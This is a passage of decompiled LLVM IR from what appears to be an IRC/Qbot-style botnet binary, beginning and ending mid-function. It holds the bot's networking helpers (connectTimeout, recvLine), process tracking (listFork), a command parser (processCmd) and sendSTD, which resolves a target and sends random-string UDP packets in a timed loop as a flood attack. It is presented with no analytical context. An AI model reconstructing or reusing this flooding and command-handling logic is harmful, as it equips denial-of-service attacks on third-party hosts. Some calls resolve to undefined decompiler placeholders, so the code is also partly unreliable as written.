  %v7_8048935 = icmp sgt i32 %v5_804892c, %stack_var_-8.0.in.lcssa
  %v2_804893d = sub i32 %v5_804892c, %stack_var_-12.0
  %v6_804893f = add i32 %v2_804893d, %tmp18
  br i1 %v7_8048935, label %dec_label_pc_8048937, label %dec_label_pc_8048915

dec_label_pc_8048937:                             ; preds = %dec_label_pc_8048915, %dec_label_pc_804890d
  %v6_804893f.lcssa = phi i32 [ %tmp18, %dec_label_pc_804890d ], [ %v6_804893f, %dec_label_pc_8048915 ]
  %v22_804893f = inttoptr i32 %v6_804893f.lcssa to i8*
  store i8 0, i8* %v22_804893f, align 1
  ret i32 %v6_804893f.lcssa

; uselistorder directives
  uselistorder i32 %v6_804893f.lcssa, { 1, 0 }
  uselistorder i32 %v5_804892c, { 2, 1, 0 }
  uselistorder i32 %stack_var_-8.0.in.lcssa, { 1, 0 }
  uselistorder i32 %stack_var_-8.0.in25, { 0, 2, 1 }
  uselistorder i32 %v5_80488dc, { 0, 2, 1 }
  uselistorder i32 %stack_var_-12.0, { 1, 0, 3, 2, 4, 5, 6 }
  uselistorder i32 %tmp18, { 0, 2, 3, 1, 4, 5 }
  uselistorder label %dec_label_pc_8048915, { 1, 0 }
  uselistorder label %dec_label_pc_804890d, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80488e7, { 1, 0 }
  uselistorder label %dec_label_pc_80488b4, { 1, 0 }
}

define i32 @getHost(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %v1_8048954 = call i32 @inet_addr(i32 %arg1)
  store i32 %v1_8048954, i32* %arg2, align 4
  %v10_8048968 = icmp eq i32 %v1_8048954, -1
  %. = zext i1 %v10_8048968 to i32
  ret i32 %.
}

define i32 @recvLine() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %tmp13 = call i32 @__decompiler_undefined_function_0()
  %tmp17 = call i32 @__decompiler_undefined_function_0()
  %tmp18 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-177 = alloca i8, align 1
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %v0_8048985 = load i32, i32* @edi, align 4
  store i32 %tmp18, i32* %eax.global-to-local, align 4
  %v3_8048998 = inttoptr i32 %tmp17 to i8*
  %v4_8048998 = call i32 @__GI_memset(i8* %v3_8048998, i32 0, i32 %tmp18)
  store i32 30, i32* %stack_var_-176, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v2_80489be = ptrtoint i32* %stack_var_-168 to i32
  %tmp34 = bitcast i32* %stack_var_-168 to i8*
  store i1 false, i1* @df, align 1
  %v5_80489c5 = call i8* @_memset(i8* %tmp34, i32 0, i32 32)
  %v2_80489d2 = udiv i32 %tmp13, 32
  %v1_80489d8 = urem i32 %tmp13, 32
  store i32 %v1_80489d8, i32* %eax.global-to-local, align 4
  %v0_80489db = load i32, i32* @ebp, align 4
  %v2_80489db = mul nuw nsw i32 %v2_80489d2, 4
  %v3_80489db = add nsw i32 %v2_80489db, -164
  %v4_80489db = add i32 %v3_80489db, %v0_80489db
  %v5_80489db = inttoptr i32 %v4_80489db to i32*
  %v6_80489db = load i32, i32* %v5_80489db, align 4
  %v9_80489db = shl i32 1, %v1_80489d8
  %v12_80489db = or i32 %v6_80489db, %v9_80489db
  store i32 %v12_80489db, i32* %v5_80489db, align 4
  %v1_80489e6 = add i32 %tmp13, 1
  %v2_80489ea = ptrtoint i32* %stack_var_-176 to i32
  store i32 %v2_80489be, i32* %eax.global-to-local, align 4
  %v5_8048a02 = call i32 @__libc_select(i32 %v1_80489e6, i32 %v2_80489be, i32 0, i32 %v2_80489be, i32 %v2_80489ea)
  store i32 %v5_8048a02, i32* %eax.global-to-local, align 4
  %tmp35 = icmp slt i32 %v5_8048a02, 1
  %tmp36 = icmp eq i1 %tmp35, false
  br i1 %tmp36, label %dec_label_pc_8048a91, label %dec_label_pc_8048a8b.preheader

dec_label_pc_8048a8b.preheader:                   ; preds = %entry
  %v7_8048a8f42 = icmp sgt i32 %tmp9, 9
  br i1 %v7_8048a8f42, label %dec_label_pc_8048a91, label %dec_label_pc_8048a15

dec_label_pc_8048a15:                             ; preds = %dec_label_pc_8048a8b.preheader, %dec_label_pc_8048a88
  %stack_var_-36.043 = phi i32 [ %v4_8048a88, %dec_label_pc_8048a88 ], [ %tmp9, %dec_label_pc_8048a8b.preheader ]
  store i32 30, i32* %stack_var_-176, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  %v5_8048a3a = call i8* @_memset(i8* %tmp34, i32 0, i32 32)
  store i32 %v1_80489d8, i32* %eax.global-to-local, align 4
  %v0_8048a50 = load i32, i32* @ebp, align 4
  %v4_8048a50 = add i32 %v3_80489db, %v0_8048a50
  %v5_8048a50 = inttoptr i32 %v4_8048a50 to i32*
  %v6_8048a50 = load i32, i32* %v5_8048a50, align 4
  %v12_8048a50 = or i32 %v6_8048a50, %v9_80489db
  store i32 %v12_8048a50, i32* %v5_8048a50, align 4
  store i32 %v2_80489be, i32* %eax.global-to-local, align 4
  %v5_8048a77 = call i32 @__libc_select(i32 %v1_80489e6, i32 %v2_80489be, i32 0, i32 %v2_80489be, i32 %v2_80489ea)
  store i32 %v5_8048a77, i32* %eax.global-to-local, align 4
  %tmp37 = icmp slt i32 %v5_8048a77, 1
  %tmp38 = icmp eq i1 %tmp37, false
  br i1 %tmp38, label %dec_label_pc_8048a91, label %dec_label_pc_8048a88

dec_label_pc_8048a88:                             ; preds = %dec_label_pc_8048a15
  %v4_8048a88 = add nsw i32 %stack_var_-36.043, 1
  %v7_8048a8f = icmp sgt i32 %stack_var_-36.043, 8
  br i1 %v7_8048a8f, label %dec_label_pc_8048a91, label %dec_label_pc_8048a15

dec_label_pc_8048a91:                             ; preds = %dec_label_pc_8048a8b.preheader, %dec_label_pc_8048a15, %dec_label_pc_8048a88, %entry
  store i32 %tmp17, i32* %eax.global-to-local, align 4
  %v2_8048aa9 = ptrtoint i8* %stack_var_-177 to i32
  br label %dec_label_pc_8048aeb

dec_label_pc_8048aa0:                             ; preds = %dec_label_pc_8048aeb
  %v0_8048aa0 = load i32, i32* @global_var_80535c0.15, align 64
  store i32 %v0_8048aa0, i32* %eax.global-to-local, align 4
  %v4_8048ab1 = call i32 @__libc_recv(i32 %v0_8048aa0, i32 %v2_8048aa9, i32 1, i32 0)
  store i32 %v4_8048ab1, i32* %eax.global-to-local, align 4
  %v9_8048ab9 = icmp eq i32 %v4_8048ab1, 1
  br i1 %v9_8048ab9, label %dec_label_pc_8048ad0, label %dec_label_pc_8048abe

dec_label_pc_8048abe:                             ; preds = %dec_label_pc_8048aa0
  %v4_8048abe = ptrtoint i8* %stack_var_-32.0 to i32
  store i32 %v4_8048abe, i32* %eax.global-to-local, align 4
  store i8 0, i8* %stack_var_-32.0, align 1
  br label %dec_label_pc_8048b08

dec_label_pc_8048ad0:                             ; preds = %dec_label_pc_8048aa0
  %v3_8048ad0 = load i8, i8* %stack_var_-177, align 1
  %v4_8048ad0 = sext i8 %v3_8048ad0 to i32
  store i32 %v4_8048ad0, i32* %eax.global-to-local, align 4
  %v4_8048ad6 = ptrtoint i8* %stack_var_-32.0 to i32
  store i8 %v3_8048ad0, i8* %stack_var_-32.0, align 1
  %v5_8048adb = add i32 %v4_8048ad6, 1
  %v22_8048adb = inttoptr i32 %v5_8048adb to i8*
  %v3_8048ade = load i8, i8* %stack_var_-177, align 1
  %v4_8048ade = sext i8 %v3_8048ade to i32
  %v6_8048ade = load i32, i32* %eax.global-to-local, align 4
  %v7_8048ade = and i32 %v6_8048ade, -256
  %v8_8048ade = or i32 %v7_8048ade, %v4_8048ade
  store i32 %v8_8048ade, i32* %eax.global-to-local, align 4
  %v10_8048ae4 = icmp eq i8 %v3_8048ade, 10
  br i1 %v10_8048ae4, label %dec_label_pc_8048af9, label %dec_label_pc_8048ae8

dec_label_pc_8048ae8:                             ; preds = %dec_label_pc_8048ad0
  %v4_8048ae8 = add i32 %stack_var_-28.0, 1
  br label %dec_label_pc_8048aeb

dec_label_pc_8048aeb:                             ; preds = %dec_label_pc_8048a91, %dec_label_pc_8048ae8
  %v7_8048aef = phi i32 [ %tmp17, %dec_label_pc_8048a91 ], [ %v8_8048ade, %dec_label_pc_8048ae8 ]
  %stack_var_-32.0 = phi i8* [ %v3_8048998, %dec_label_pc_8048a91 ], [ %v22_8048adb, %dec_label_pc_8048ae8 ]
  %stack_var_-28.0 = phi i32 [ 0, %dec_label_pc_8048a91 ], [ %v4_8048ae8, %dec_label_pc_8048ae8 ]
  %stack_var_12.0 = phi i32 [ %tmp18, %dec_label_pc_8048a91 ], [ %v4_8048aeb, %dec_label_pc_8048ae8 ]
  %v4_8048aeb = add i32 %stack_var_12.0, -1
  %v9_8048aeb = sub i32 0, %stack_var_12.0
  %v10_8048aeb = and i32 %stack_var_12.0, %v9_8048aeb
  %v11_8048aeb = icmp slt i32 %v10_8048aeb, 0
  %v12_8048aeb = icmp eq i32 %v4_8048aeb, 0
  %v13_8048aeb = icmp slt i32 %v4_8048aeb, 0
  %v3_8048aef = icmp eq i1 %v13_8048aeb, %v11_8048aeb
  %v4_8048aef = icmp eq i1 %v12_8048aeb, false
  %v5_8048aef = and i1 %v4_8048aef, %v3_8048aef
  %v6_8048aef = zext i1 %v5_8048aef to i32
  %v8_8048aef = and i32 %v7_8048aef, -256
  %v9_8048aef = or i32 %v6_8048aef, %v8_8048aef
  store i32 %v9_8048aef, i32* %eax.global-to-local, align 4
  %v4_8048af5 = icmp eq i1 %v5_8048aef, false
  %v1_8048af7 = icmp eq i1 %v4_8048af5, false
  br i1 %v1_8048af7, label %dec_label_pc_8048aa0, label %dec_label_pc_8048af9

dec_label_pc_8048af9:                             ; preds = %dec_label_pc_8048ad0, %dec_label_pc_8048aeb
  %stack_var_-32.1 = phi i8* [ %v22_8048adb, %dec_label_pc_8048ad0 ], [ %stack_var_-32.0, %dec_label_pc_8048aeb ]
  store i8 0, i8* %stack_var_-32.1, align 1
  store i32 %stack_var_-28.0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8048b08

dec_label_pc_8048b08:                             ; preds = %dec_label_pc_8048abe, %dec_label_pc_8048af9
  %storemerge = phi i32 [ -1, %dec_label_pc_8048abe ], [ %stack_var_-28.0, %dec_label_pc_8048af9 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %v0_8048985, i32* @edi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v4_8048aeb, { 2, 1, 0 }
  uselistorder i32 %stack_var_12.0, { 1, 0, 2 }
  uselistorder i32 %stack_var_-28.0, { 1, 0, 2 }
  uselistorder i8* %stack_var_-32.0, { 2, 0, 1, 3, 4 }
  uselistorder i8* %v22_8048adb, { 1, 0 }
  uselistorder i32 %v1_80489d8, { 2, 1, 0 }
  uselistorder i32 %v2_80489be, { 0, 3, 4, 1, 2, 5 }
  uselistorder i32* %stack_var_-176, { 0, 2, 1 }
  uselistorder i8* %stack_var_-177, { 2, 1, 0 }
  uselistorder i32 %tmp18, { 1, 0, 2 }
  uselistorder i32 %tmp17, { 0, 2, 1 }
  uselistorder i32 %tmp13, { 2, 1, 0 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 8, 2, 3, 4, 5, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder label %dec_label_pc_8048b08, { 1, 0 }
  uselistorder label %dec_label_pc_8048af9, { 1, 0 }
  uselistorder label %dec_label_pc_8048aeb, { 1, 0 }
  uselistorder label %dec_label_pc_8048a91, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_8048a15, { 1, 0 }
}

define i32 @connectTimeout(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v0_8048b16 = load i32, i32* @edi, align 4
  %v3_8048b27 = call i32 @__libc_fcntl(i32 %arg1, i32 3, i32 0)
  %v4_8048b32 = or i32 %v3_8048b27, 2048
  %v3_8048b44 = call i32 @__libc_fcntl(i32 %arg1, i32 4, i32 %v4_8048b32)
  store i32 2, i32* %stack_var_-40, align 4
  %v1_8048b55 = urem i32 %arg3, 65536
  %v1_8048b5e = call i32 @__GI_htons(i32 %v1_8048b55)
  store i32 %arg2, i32* @edx, align 4
  %v3_8048b78 = call i32 @getHost(i32 %arg2, i32* nonnull %stack_var_-36)
  %v1_8048b80 = icmp eq i32 %v3_8048b78, 0
  br i1 %v1_8048b80, label %dec_label_pc_8048b93, label %dec_label_pc_8048b84

dec_label_pc_8048b84:                             ; preds = %entry
  br label %dec_label_pc_8048cd3

dec_label_pc_8048b93:                             ; preds = %entry
  %v2_8048b70 = ptrtoint i32* %stack_var_-40 to i32
  %v3_8048ba1 = bitcast i32* %stack_var_-32 to i8*
  %v4_8048ba1 = call i32 @__GI_memset(i8* %v3_8048ba1, i32 0, i32 8)
  %v3_8048bb5 = call i32 @__libc_connect(i32 %arg1, i32 %v2_8048b70, i32 16)
  %v5_8048bc0 = icmp slt i32 %v3_8048bb5, 0
  %v1_8048bc4 = icmp eq i1 %v5_8048bc0, false
  br i1 %v1_8048bc4, label %dec_label_pc_8048c9a, label %dec_label_pc_8048bca

dec_label_pc_8048bca:                             ; preds = %dec_label_pc_8048b93
  %v1_8048bca = call i32 @__GI___errno_location(i32 %v3_8048bb5)
  %v1_8048bcf = inttoptr i32 %v1_8048bca to i32*
  %v2_8048bcf = load i32, i32* %v1_8048bcf, align 4
  %v9_8048bd1 = icmp eq i32 %v2_8048bcf, 115
  %v1_8048bd4 = icmp eq i1 %v9_8048bd1, false
  br i1 %v1_8048bd4, label %dec_label_pc_8048c8e, label %dec_label_pc_8048bda

dec_label_pc_8048bda:                             ; preds = %dec_label_pc_8048bca
  store i32 %arg4, i32* %stack_var_-176, align 4
  %v2_8048bf7 = ptrtoint i32* %stack_var_-168 to i32
  %tmp31 = bitcast i32* %stack_var_-168 to i8*
  store i1 false, i1* @df, align 1
  %v5_8048bfe = call i8* @_memset(i8* %tmp31, i32 0, i32 32)
  %v2_8048c0b = udiv i32 %arg1, 32
  %v1_8048c11 = urem i32 %arg1, 32
  %v0_8048c14 = load i32, i32* @ebp, align 4
  %v2_8048c14 = mul nuw nsw i32 %v2_8048c0b, 4
  %v3_8048c14 = add nsw i32 %v2_8048c14, -164
  %v4_8048c14 = add i32 %v3_8048c14, %v0_8048c14
  %v5_8048c14 = inttoptr i32 %v4_8048c14 to i32*
  %v6_8048c14 = load i32, i32* %v5_8048c14, align 4
  %v9_8048c14 = shl i32 1, %v1_8048c11
  %v12_8048c14 = or i32 %v6_8048c14, %v9_8048c14
  store i32 %v12_8048c14, i32* %v5_8048c14, align 4
  %v1_8048c1f = add i32 %arg1, 1
  %v2_8048c23 = ptrtoint i32* %stack_var_-176 to i32
  %v5_8048c36 = call i32 @__libc_select(i32 %v1_8048c1f, i32 0, i32 %v2_8048bf7, i32 0, i32 %v2_8048c23)
  %tmp32 = icmp slt i32 %v5_8048c36, 1
  br i1 %tmp32, label %dec_label_pc_8048c82, label %dec_label_pc_8048c42

dec_label_pc_8048c42:                             ; preds = %dec_label_pc_8048bda
  store i32 4, i32* %stack_var_-180, align 4
  %v2_8048c4f = ptrtoint i32* %stack_var_-180 to i32
  %v2_8048c56 = ptrtoint i32* %stack_var_-184 to i32
  %v5_8048c64 = call i32 @getsockopt(i32 %arg1, i32 1, i32 4, i32 %v2_8048c56, i32 %v2_8048c4f)
  %v3_8048c6c = load i32, i32* %stack_var_-184, align 4
  %v1_8048c72 = icmp eq i32 %v3_8048c6c, 0
  br i1 %v1_8048c72, label %dec_label_pc_8048c9a, label %dec_label_pc_8048c76

dec_label_pc_8048c76:                             ; preds = %dec_label_pc_8048c42
  br label %dec_label_pc_8048cd3

dec_label_pc_8048c82:                             ; preds = %dec_label_pc_8048bda
  br label %dec_label_pc_8048cd3

dec_label_pc_8048c8e:                             ; preds = %dec_label_pc_8048bca
  br label %dec_label_pc_8048cd3

dec_label_pc_8048c9a:                             ; preds = %dec_label_pc_8048c42, %dec_label_pc_8048b93
  %v3_8048ca4 = call i32 @__libc_fcntl(i32 %arg1, i32 3, i32 0)
  %v4_8048caf = and i32 %v3_8048ca4, -2049
  %v3_8048cc1 = call i32 @__libc_fcntl(i32 %arg1, i32 4, i32 %v4_8048caf)
  br label %dec_label_pc_8048cd3

dec_label_pc_8048cd3:                             ; preds = %dec_label_pc_8048c8e, %dec_label_pc_8048c82, %dec_label_pc_8048c76, %dec_label_pc_8048b84, %dec_label_pc_8048c9a
  %v3_8048cd3 = phi i32 [ 0, %dec_label_pc_8048c8e ], [ 0, %dec_label_pc_8048c82 ], [ 0, %dec_label_pc_8048c76 ], [ 0, %dec_label_pc_8048b84 ], [ 1, %dec_label_pc_8048c9a ]
  store i32 %v0_8048b16, i32* @edi, align 4
  ret i32 %v3_8048cd3

; uselistorder directives
  uselistorder i32* %stack_var_-40, { 1, 0 }
  uselistorder i32* %stack_var_-176, { 1, 0 }
  uselistorder i32* %stack_var_-180, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__libc_select, { 2, 1, 0 }
  uselistorder i32 %arg1, { 8, 7, 6, 5, 1, 0, 4, 3, 2 }
  uselistorder label %dec_label_pc_8048cd3, { 4, 0, 1, 2, 3 }
}

define i32 @listFork() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v0_8048ce1 = load i32, i32* @ebx, align 4
  store i32 %v0_8048ce1, i32* %stack_var_-8, align 4
  %v1_8048ce5 = call i32 @__libc_fork(i32 %v0_8048ce1)
  %v4_8048ced = icmp eq i32 %v1_8048ce5, 0
  %v1_8048cf1 = icmp eq i1 %v4_8048ced, false
  br i1 %v1_8048cf1, label %dec_label_pc_8048cfe, label %dec_label_pc_8048cf3

dec_label_pc_8048cf3:                             ; preds = %entry
  br label %dec_label_pc_8048de8

dec_label_pc_8048cfe:                             ; preds = %entry
  %v0_8048cfe = load i32, i32* @global_var_80535b8.16, align 8
  %v0_8048d03 = load i32, i32* @global_var_80535bc.17, align 4
  %v1_8048d09 = add i32 %v0_8048cfe, 1
  %v5_8048d09 = icmp eq i32 %v0_8048cfe, -1
  %v2_8048d0c = zext i1 %v5_8048d09 to i32
  %v3_8048d0c = add i32 %v2_8048d0c, %v0_8048d03
  store i32 %v1_8048d09, i32* @global_var_80535b8.16, align 8
  store i32 %v3_8048d0c, i32* @global_var_80535bc.17, align 4
  %tmp = mul i32 %v0_8048cfe, 4
  %v2_8048d31 = add i32 %tmp, 8
  %v1_8048d37 = call i32 @malloc(i32 %v2_8048d31)
  br label %dec_label_pc_8048d6d

dec_label_pc_8048d4b:                             ; preds = %dec_label_pc_8048d6d, %dec_label_pc_8048d9e
  %v2_8048d4e = mul i32 %storemerge1, 4
  %v5_8048d53 = add i32 %v2_8048d4e, %v1_8048d37
  %v0_8048d5e = load i32, i32* @global_var_8055804.18, align 4
  %v2_8048d63 = add i32 %v0_8048d5e, %v2_8048d4e
  %v1_8048d66 = inttoptr i32 %v2_8048d63 to i32*
  %v2_8048d66 = load i32, i32* %v1_8048d66, align 4
  %v2_8048d68 = inttoptr i32 %v5_8048d53 to i32*
  store i32 %v2_8048d66, i32* %v2_8048d68, align 4
  %v4_8048d6a = add i32 %storemerge1, 1
  br label %dec_label_pc_8048d6d

dec_label_pc_8048d6d:                             ; preds = %dec_label_pc_8048cfe, %dec_label_pc_8048d4b
  %storemerge1 = phi i32 [ %v4_8048d6a, %dec_label_pc_8048d4b ], [ 0, %dec_label_pc_8048cfe ]
  %v0_8048d7b = load i32, i32* @global_var_80535b8.16, align 8
  %v0_8048d80 = load i32, i32* @global_var_80535bc.17, align 4
  %v4_8048d8a = icmp ne i32 %v0_8048d7b, 0
  %v2_8048d8d = zext i1 %v4_8048d8a to i32
  %v3_8048d8d = add i32 %v0_8048d80, -1
  %v4_8048d8d = add i32 %v3_8048d8d, %v2_8048d8d
  store i32 %v4_8048d8d, i32* @ebx, align 4
  %v10_8048d99 = icmp eq i32 %v4_8048d8d, 0
  br i1 %v10_8048d99, label %dec_label_pc_8048d9e, label %dec_label_pc_8048d4b

dec_label_pc_8048d9e:                             ; preds = %dec_label_pc_8048d6d
  %v1_8048d8a = add i32 %v0_8048d7b, -1
  %v10_8048da9 = icmp ult i32 %storemerge1, %v1_8048d8a
  br i1 %v10_8048da9, label %dec_label_pc_8048d4b, label %dec_label_pc_8048dae

dec_label_pc_8048dae:                             ; preds = %dec_label_pc_8048d9e
  %v2_8048db9 = mul i32 %v0_8048d7b, 4
  %v1_8048dbc = add i32 %v1_8048d37, -4
  %v5_8048dc1 = add i32 %v1_8048dbc, %v2_8048db9
  %v2_8048dc7 = inttoptr i32 %v5_8048dc1 to i32*
  store i32 %v1_8048ce5, i32* %v2_8048dc7, align 4
  %v0_8048dc9 = load i32, i32* @global_var_8055804.18, align 4
  %v1_8048dd2 = call i32 @free(i32 %v0_8048dc9)
  store i32 %v1_8048d37, i32* @global_var_8055804.18, align 4
  store i32 %v1_8048ce5, i32* @ecx, align 4
  %v3_8048deb.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_8048de8

dec_label_pc_8048de8:                             ; preds = %dec_label_pc_8048cf3, %dec_label_pc_8048dae
  %v3_8048deb = phi i32 [ %v0_8048ce1, %dec_label_pc_8048cf3 ], [ %v3_8048deb.pre, %dec_label_pc_8048dae ]
  store i32 %v3_8048deb, i32* @ebx, align 4
  ret i32 %v1_8048ce5

; uselistorder directives
  uselistorder i32 %storemerge1, { 1, 0, 2 }
  uselistorder i32 %v2_8048d4e, { 1, 0 }
  uselistorder i32 %v1_8048d37, { 2, 0, 1 }
  uselistorder i32 %v0_8048cfe, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8048de8, { 1, 0 }
  uselistorder label %dec_label_pc_8048d6d, { 1, 0 }
  uselistorder label %dec_label_pc_8048d4b, { 1, 0 }
}

define i32 @sendSTD(i32 %arg1, i16 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v4_8048df6 = add i32 %arg4, -4096
  %v6_8048df6 = sub i32 4095, %arg4
  %v7_8048df6 = and i32 %v6_8048df6, %arg4
  %v8_8048df6 = icmp slt i32 %v7_8048df6, 0
  %v9_8048df6 = icmp eq i32 %v4_8048df6, 0
  %v10_8048df6 = icmp slt i32 %v4_8048df6, 0
  %v3_8048dfd = icmp eq i1 %v10_8048df6, %v8_8048df6
  %v4_8048dfd = icmp eq i1 %v9_8048df6, false
  %v5_8048dfd = and i1 %v4_8048dfd, %v3_8048dfd
  br i1 %v5_8048dfd, label %dec_label_pc_8048f52, label %dec_label_pc_8048e03

dec_label_pc_8048e03:                             ; preds = %entry
  %v3_8048e0c = call i32 @socket(i32 2, i32 2, i32 0)
  %v2_8048e1c = call i32 @__GI_time(i32* null)
  %v1_8048e2e = call i32 @__GI_gethostbyname(i32 %arg1)
  %v2_8048e3e = ptrtoint i32* %stack_var_-44 to i32
  %v2_8048e42 = call i32 @bzero(i32 %v2_8048e3e, i32 16)
  %v1_8048e4d = add i32 %v1_8048e2e, 12
  %v2_8048e4d = inttoptr i32 %v1_8048e4d to i32*
  %v3_8048e4d = load i32, i32* %v2_8048e4d, align 4
  %v1_8048e55 = add i32 %v1_8048e2e, 16
  %v2_8048e55 = inttoptr i32 %v1_8048e55 to i32*
  %v3_8048e55 = load i32, i32* %v2_8048e55, align 4
  %v1_8048e58 = inttoptr i32 %v3_8048e55 to i32*
  %v2_8048e58 = load i32, i32* %v1_8048e58, align 4
  %v15_8048e61 = ptrtoint i32* %stack_var_-40 to i32
  %v3_8048e66 = call i32 @bcopy(i32 %v2_8048e58, i32 %v15_8048e61, i32 %v3_8048e4d)
  %v1_8048e71 = add i32 %v1_8048e2e, 8
  %v2_8048e71 = inttoptr i32 %v1_8048e71 to i32*
  %v3_8048e71 = load i32, i32* %v2_8048e71, align 4
  store i32 %v3_8048e71, i32* %stack_var_-44, align 4
  %v2_8048ebf = ptrtoint i32* %stack_var_-76 to i32
  %v2_8048ec6 = bitcast i32* %stack_var_-76 to i8*
  %v5_8048f16 = add i32 %v2_8048e1c, %arg3
  br label %dec_label_pc_8048e86

dec_label_pc_8048e86:                             ; preds = %dec_label_pc_8048f4a, %dec_label_pc_8048e03
  %storemerge = phi i32 [ %v4_8048f4a, %dec_label_pc_8048f4a ], [ 0, %dec_label_pc_8048e03 ]
  %tmp25 = icmp ult i32 %storemerge, 50
  br i1 %tmp25, label %dec_label_pc_8048f4a, label %dec_label_pc_8048e90

dec_label_pc_8048e90:                             ; preds = %dec_label_pc_8048e86
  %v2_8048e95 = call i32 @__GI_time(i32* null)
  %v1_8048ea1 = call i32 @srand(i32 %v2_8048e95)
  %v0_8048ea9 = call i32 @rand_init()
  %v0_8048eae = call i32 @rand_next()
  %v1_8048eb3 = mul i32 %v0_8048eae, 4
  %v2_8048eb6 = and i32 %v1_8048eb3, 12
  %v1_8048eb9 = add nuw nsw i32 %v2_8048eb6, 12
  store i32 %v2_8048ebf, i32* @eax, align 4
  %v3_8048ec6 = call i32 @rand_alphastr(i8* %v2_8048ec6, i32 %v1_8048eb9)
  %v0_8048ed1 = load i32, i32* @ebp, align 4
  %v2_8048ed1 = add nsw i32 %v2_8048eb6, -60
  %v3_8048ed1 = add i32 %v2_8048ed1, %v0_8048ed1
  %v4_8048ed1 = inttoptr i32 %v3_8048ed1 to i8*
  store i8 0, i8* %v4_8048ed1, align 1
  %v4_8048ee8 = call i32 @__libc_send(i32 %v3_8048e0c, i32 %v2_8048ebf, i32 %arg4, i32 0)
  %v3_8048efc = call i32 @__libc_connect(i32 %v3_8048e0c, i32 %v2_8048e3e, i32 16)
  %v2_8048f09 = call i32 @__GI_time(i32* null)
  %v5_8048f1b = icmp slt i32 %v2_8048f09, %v5_8048f16
  br i1 %v5_8048f1b, label %dec_label_pc_8048f4a, label %dec_label_pc_8048f1d

dec_label_pc_8048f1d:                             ; preds = %dec_label_pc_8048e90
  %v1_8048f23 = call i32 @__GI_close(i32 %v3_8048e0c)
  %v1_8048f31 = call i32 @free(i32 %v2_8048ebf)
  %v1_8048f3e = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_8048f4a:                             ; preds = %dec_label_pc_8048e90, %dec_label_pc_8048e86
  %stack_var_-16.0 = phi i32 [ %storemerge, %dec_label_pc_8048e86 ], [ 0, %dec_label_pc_8048e90 ]
  %v4_8048f4a = add i32 %stack_var_-16.0, 1
  br label %dec_label_pc_8048e86

dec_label_pc_8048f52:                             ; preds = %entry
  %v0_8048f53 = load i32, i32* @eax, align 4
  ret i32 %v0_8048f53

; uselistorder directives
  uselistorder i32 %v2_8048eb6, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i32 %v4_8048df6, { 1, 0 }
  uselistorder i32 %arg4, { 1, 0, 2, 3 }
}

define i32 @processCmd() local_unnamed_addr {
entry:
  %tmp21 = call i32 @__decompiler_undefined_function_0()
  %tmp22 = call i32 @__decompiler_undefined_function_0()
  %v0_8048f57 = load i32, i32* @ebx, align 4
  %v1_8048f5e = inttoptr i32 %tmp22 to i32*
  %v2_8048f5e = load i32, i32* %v1_8048f5e, align 4
  store i32 %v2_8048f5e, i32* @eax, align 4
  %v2_8048f69 = inttoptr i32 %v2_8048f5e to i8*
  %v3_8048f69 = call i32 @__GI_strcoll(i8* %v2_8048f69, i32 ptrtoint (i32* @global_var_8050853.19 to i32))
  %v1_8048f71 = icmp eq i32 %v3_8048f69, 0
  %v1_8048f73 = icmp eq i1 %v1_8048f71, false
  br i1 %v1_8048f73, label %dec_label_pc_8049070, label %dec_label_pc_8048f79

dec_label_pc_8048f79:                             ; preds = %entry
  %v7_8048f7d = icmp sgt i32 %tmp21, 4
  br i1 %v7_8048f7d, label %dec_label_pc_8048f83, label %dec_label_pc_8049130

dec_label_pc_8048f83:                             ; preds = %dec_label_pc_8048f79
  %v1_8048f86 = add i32 %tmp22, 4
  %v1_8048f89 = inttoptr i32 %v1_8048f86 to i32*
  %v2_8048f89 = load i32, i32* %v1_8048f89, align 4
  %v1_8048f91 = add i32 %tmp22, 8
  %v1_8048f94 = inttoptr i32 %v1_8048f91 to i32*
  %v2_8048f94 = load i32, i32* %v1_8048f94, align 4
  %v1_8048f9a = call i32 @atol(i32 %v2_8048f94)
  %v1_8048fa8 = add i32 %tmp22, 12
  %v1_8048fab = inttoptr i32 %v1_8048fa8 to i32*
  %v2_8048fab = load i32, i32* %v1_8048fab, align 4
  %v1_8048fb1 = call i32 @atol(i32 %v2_8048fab)
  %v1_8048fbf = add i32 %tmp22, 16
  %v1_8048fc2 = inttoptr i32 %v1_8048fbf to i32*
  %v2_8048fc2 = load i32, i32* %v1_8048fc2, align 4
  %v1_8048fc8 = call i32 @atol(i32 %v2_8048fc2)
  %v2_8048fdc = inttoptr i32 %v2_8048f89 to i8*
  %v3_8048fdc = call i32 @__GI_strchr(i8* %v2_8048fdc, i32 44)
  %v1_8048fe4 = icmp eq i32 %v3_8048fdc, 0
  br i1 %v1_8048fe4, label %dec_label_pc_8049045, label %dec_label_pc_8048fe8

dec_label_pc_8048fe8:                             ; preds = %dec_label_pc_8048f83
